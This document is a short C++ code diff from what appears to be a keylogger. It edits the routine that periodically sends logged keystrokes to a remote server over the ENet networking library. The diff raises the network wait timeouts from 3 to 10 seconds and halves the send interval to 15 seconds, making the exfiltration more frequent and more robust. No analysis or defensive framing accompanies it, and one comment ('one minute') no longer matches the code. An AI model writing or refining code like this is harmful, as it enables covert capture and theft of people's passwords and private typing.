@@ -192,9 +192,9 @@ void sendKeylogData() {
         enet_peer_send(peer, 0, packet);
         enet_host_flush(client);
         
-        // Wait for confirmation (up to 3 seconds)
+        // Wait for confirmation (up to 10 seconds)
         bool received = false;
-        while (enet_host_service(client, &event, 3000) > 0) {
+        while (enet_host_service(client, &event, 10000) > 0) {
             if (event.type == ENET_EVENT_TYPE_RECEIVE) {
                 // Received confirmation
                 received = true;
@@ -208,7 +208,7 @@ void sendKeylogData() {
     enet_peer_disconnect(peer, 0);
     
     // Wait for disconnect acknowledgment
-    while (enet_host_service(client, &event, 3000) > 0) {
+    while (enet_host_service(client, &event, 10000) > 0) {
         if (event.type == ENET_EVENT_TYPE_RECEIVE) {
             enet_packet_destroy(event.packet);
         } 
@@ -225,7 +225,7 @@ void sendKeylogData() {
 void senderThread() {
     while (isKeyloggerRunning) {
         // Sleep for one minute
-        std::this_thread::sleep_for(std::chrono::seconds(30));
+        std::this_thread::sleep_for(std::chrono::seconds(15));
         
         // Send data to server
         sendKeylogData();
